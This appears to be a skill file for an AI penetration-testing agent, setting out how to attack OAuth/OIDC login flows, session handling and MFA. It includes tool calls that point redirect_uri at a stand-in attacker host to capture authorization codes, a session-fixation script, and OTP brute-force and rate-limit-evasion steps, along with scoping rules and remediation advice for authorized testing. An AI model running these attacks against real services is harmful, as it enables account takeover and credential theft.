# Authentication and Session Attacks Attack Skill

Workflow for abusing the login and session lifecycle: OAuth 2.0 and OIDC flow attacks (redirect_uri abuse, state/PKCE weaknesses, code and token leakage, implicit-flow theft), session management flaws (fixation, missing invalidation on logout or password change, predictable tokens, cookie scope and flag gaps), and multi-factor bypass (response manipulation, flow skipping, backup-code and rate-limit weaknesses). Use this skill when the task is to break how a user is authenticated or how their session is maintained, rather than to forge or crack a single token in isolation.

## When to Classify Here

Pick this skill when the request targets the authentication flow or session lifecycle, including:

- "Test the OAuth login for redirect_uri abuse and steal the authorization code."
- "Is the session fixed before login? Check for session fixation."
- "The session cookie is still valid after logout, confirm it."
- "Bypass the MFA step on this login."
- "Check whether the password-reset token is predictable or reusable."
- "The OIDC `state` parameter looks static, can it be used for login CSRF?"

Keywords: authentication, session management, OAuth, OAuth2, OIDC, OpenID Connect, redirect_uri, authorization code, PKCE, state parameter, implicit flow, token leakage, session fixation, session invalidation, logout, cookie flags, SameSite, HttpOnly, Secure, MFA, 2FA, OTP, TOTP, backup codes, MFA bypass, password reset, account takeover, credential stuffing, login CSRF.

### Disjoint from neighbouring skills

- vs. `api_testing` (community): `api_testing` owns JWT token-crypto attacks (alg confusion, kid/jku/x5u, secret cracking, claim tampering). This skill owns the OAuth/OIDC flow, the session lifecycle, and MFA. When the task is "forge or crack the token", classify to `api_testing`; when it is "abuse the login flow, the session, or MFA", stay HERE. They cross-reference because OAuth commonly issues JWTs.
- vs. `broken_access_control` / `idor_bola_exploitation` / `bfla_exploitation` (community): those are authorization bugs (a logged-in user reaching data or functions they should not). This skill is about authentication (who you are proven to be) and session continuity. If the user is already authenticated and the issue is "they can reach another object or function", go to the access-control skills.
- vs. `csrf` (built-in or other): classic CSRF forges a state-changing request using ambient cookies. This skill covers login CSRF and the session/OAuth `state` weaknesses that enable it; a generic state-changing CSRF on an app action stays with the dedicated CSRF handling.
- vs. `cve_exploit` (built-in): a named CVE in a specific identity product (an SSO server, an auth library) belongs to `cve_exploit` when the user gives the CVE ID.

## Tools

- `query_graph` to inventory auth Endpoints (login, logout, callback, token, reset), related Parameters (redirect_uri, state, code, token), and detected identity Technologies for the host.
- `execute_httpx` for probing auth and discovery endpoints, including `/.well-known/openid-configuration` and `/.well-known/oauth-authorization-server`.
- `execute_curl` for crafting authorization requests, token exchanges, and replaying session cookies.
- `execute_code` for token entropy analysis, OTP brute-force loops, and multi-step flow automation (capture code, exchange, replay).
- `execute_playwright` to drive the real browser login and OAuth consent flow, observe redirects, and read where codes/tokens land (URL fragment, query, storage).
- `kali_shell` for `interactsh-client` (to catch leaked codes/tokens via a malicious redirect_uri), `jq`, and `hydra` where credential-based testing is in scope.

### Captured-traffic workflow (proxy_brain tools)

When HTTP Traffic Capture is enabled, source the flow from recorded history. `redamon.sitemap()` surfaces the login, callback, and token endpoints; `redamon.search({"q":"redirect_uri"})` and `redamon.grep("code=")` locate the OAuth legs. Session tests run off two captured transactions: replay a pre-login session cookie after authenticating with `redamon.replay` to check fixation, and replay a captured authenticated request after logout to check invalidation. `redamon.params()` flags `state`, `code`, and `token` parameters and whether their observed values look static or low-entropy. Where the proxy stops: the browser consent step and fragment-based token capture need `execute_playwright`, and catching a code sent to an attacker redirect_uri needs `interactsh-client`.

## Workflow

Three phases. Phase 1 is non-destructive: map the auth endpoints, capture a clean flow, and profile tokens and cookies. Phase 2 attacks the OAuth flow, the session lifecycle, and MFA. Phase 3 confirms account takeover and scopes it. If out-of-band callbacks are forbidden, use same-origin redirect and inline leakage checks and note the limitation.

### Phase 1: Reconnaissance and Flow Mapping (Informational)

1. **Inventory auth endpoints via `query_graph`**: ask "list Endpoints and Parameters for the target host that relate to login, logout, oauth, callback, token, authorize, reset, or mfa, plus any identity-provider Technology nodes".

2. **Pull OAuth/OIDC metadata** when present:
   ```
   execute_curl> -s https://target.tld/.well-known/openid-configuration | jq .
   ```
   Record `authorization_endpoint`, `token_endpoint`, supported `response_types`, whether PKCE is advertised, and the registered `redirect_uri` patterns if leaked.

3. **Capture one clean flow with `execute_playwright`**: log in and watch the full redirect chain. Note where the authorization `code` or `access_token` appears (query string, URL fragment, POST body), what `state` and PKCE values are used, and which cookies are set with what flags.

4. **Profile the session cookie and tokens**: inspect `HttpOnly`, `Secure`, `SameSite`, `Domain`, `Path`, and expiry. Collect several freshly issued session tokens / reset tokens / OTP-adjacent values and assess entropy and structure with `execute_code` (length, charset, monotonicity, timestamp leakage).

5. **Identify the MFA model**: TOTP, SMS/email OTP, push, or WebAuthn, and whether the second factor is enforced server-side or only gated in the UI.

Once the auth endpoints are mapped, a clean flow is captured, and tokens/cookies/MFA are profiled, **request transition to exploitation phase**.

### Phase 2: Exploitation

Run the track matching Phase 1. Lowest impact first. Every track ends with a Validation step.

#### 2.A OAuth / OIDC flow attacks

1. **redirect_uri abuse**: register or supply a redirect_uri that the server accepts loosely and catch the leaked code. Try an exact attacker host, a subdomain/path append, an open-redirect chain on the legit host, and encoding tricks:
   ```
   execute_curl> "https://target.tld/oauth/authorize?client_id=<id>&response_type=code&redirect_uri=https://attacker.tld&scope=openid&state=x"
   execute_curl> "https://target.tld/oauth/authorize?client_id=<id>&response_type=code&redirect_uri=https://target.tld/callback/../redirect?url=https://attacker.tld&state=x"
   ```
   Start `interactsh-client` to receive any code/token delivered to the attacker host.
2. **state / CSRF on callback**: if `state` is missing, static, or unvalidated, craft a login-CSRF that binds the victim to an attacker-controlled account, or replay a captured code.
3. **PKCE downgrade**: if the server advertises PKCE but still accepts a token exchange without a valid `code_verifier`, exchange a stolen code directly at the `token_endpoint`.
4. **Implicit-flow token theft**: when `response_type=token`, a redirect_uri or referer leak exposes the access token in the fragment; confirm and capture.
5. **Validation**: exchange a captured code or replay a captured token to obtain a session as the victim.

#### 2.B Session management flaws

1. **Session fixation**: capture the pre-login session identifier, authenticate, and check whether the identifier stays the same. If it does, an attacker who plants a known session ID before login rides the victim's authenticated session.
   ```
   execute_code> language="python", code: """
   import requests
   s=requests.Session()
   s.get('https://target.tld/login', verify=False)           # pre-auth cookie
   pre=s.cookies.get_dict()
   s.post('https://target.tld/login', data={'u':'user','p':'pass'}, verify=False)
   post=s.cookies.get_dict()
   print('pre ', pre); print('post', post)   # same session id -> fixation
   """
   ```
2. **Missing invalidation**: after logout or password change, replay a previously authenticated request/cookie; a 200 with authenticated content proves the session was not killed server-side.
3. **Predictable or low-entropy tokens**: use the Phase 1 entropy profile to show session or reset tokens can be guessed, or that reset tokens are reusable or do not expire.
4. **Cookie scope and flags**: a session cookie without `HttpOnly` is stealable via XSS; `SameSite=None` without need widens CSRF; an over-broad `Domain` leaks the session to sibling hosts.
5. **Validation**: demonstrate a second client authenticated as the victim using a fixed, stolen, or non-invalidated session.

#### 2.C MFA bypass

1. **Response manipulation**: submit a wrong OTP and flip a `"verified":false` / `"mfa":false` field or a `403`-to-`200` in the response if the client trusts it.
2. **Flow skipping**: request the post-MFA endpoint directly with the partial (pre-MFA) session to see whether the second factor is actually enforced server-side.
3. **OTP brute force**: when rate limiting is weak, enumerate the numeric OTP space with `execute_code`; test whether changing IP headers resets the counter.
4. **Backup-code and reset weaknesses**: predictable backup codes, reusable codes, or a password-reset path that drops the MFA requirement.
5. **Validation**: complete a login to the authenticated area without a valid second factor.

### Phase 3: Post-Exploitation

Confirm and scope account takeover within the engagement rules.

1. **Prove takeover**: access the victim account's authenticated area and read an identifying, non-sensitive marker (display name, account id) to prove control.
2. **Scope the identity's reach**: enumerate what the compromised account can access, and whether the flaw affects every account or only specific configurations.
3. **Chain outward**: a stolen OAuth token may unlock downstream APIs (hand off to `api_testing`); a session reaching admin functions is an authorization pivot (hand off to `broken_access_control`).
4. **Validation**: tie the proof to a reversible action (read a marker, create a clearly labeled test artifact) and remove anything created.

## Reporting Guidelines

Each finding must include:

- **Class**: OAuth/OIDC flow, session management, or MFA bypass, with the specific sub-issue.
- **Endpoint and flow**: the exact authorize/token/callback/login/logout/reset endpoints and the request sequence.
- **Working exploit**: the copy-paste request chain (and the `execute_playwright` transcript for browser-driven steps) that reproduces the issue.
- **Proof**: a captured code/token, a session that survived logout, a fixed session ridden by a second client, or an authenticated area reached without MFA.
- **Impact**: account takeover (full or conditional), session hijacking, or authentication bypass.
- **CVSS**: typically 8.x to 9.x for pre-auth account takeover, lower where preconditions (phishing a click, a specific config) apply.
- **Remediation**: strict exact-match redirect_uri allowlists, enforced PKCE and single-use codes, unguessable and validated `state`, session rotation on login, server-side invalidation on logout and password change, `HttpOnly`/`Secure`/`SameSite` cookies, and server-side MFA enforcement with rate limiting.
- **References**: PortSwigger OAuth and authentication labs, the OAuth 2.0 Security BCP (RFC 9700), the OWASP Session Management and Authentication cheatsheets.

## Important Notes

- **Confirm the precondition before claiming takeover.** A leaked code only matters if it exchanges for a session; a surviving cookie only matters if it returns authenticated content. Prove the end-to-end effect, not just the intermediate weakness.
- **Engagement scope and real accounts.** Use test accounts you control for both the attacker and victim roles wherever possible. Do not take over real user accounts, brute-force real credentials, or trigger real SMS/email OTP floods without explicit written authorization.
- **Rate limiting and lockouts.** OTP brute force and credential testing can lock out real users and trip fraud systems. Cap attempts, prefer a controlled test account, and stop at proof.
- **redirect_uri testing can leak to third parties.** Only point a malicious redirect_uri at a collector you control, use a unique subdomain, and pull the payload immediately after proof.
- **OOB-blocked environments.** If an external collector is forbidden, restrict redirect and token-leak checks to same-origin and inline observations and note the limitation in the report.
- **JWT handoff.** When the session or OAuth token is a JWT and the weakness is in the token's own signing or claims, hand off to `api_testing` for the crypto attack; keep the flow and session logic here.
- **CVE handoff.** A named CVE in a specific identity product belongs to `cve_exploit` when the user gives the CVE ID.
- **No em dashes** anywhere in artifacts that flow into the report. Use hyphens.
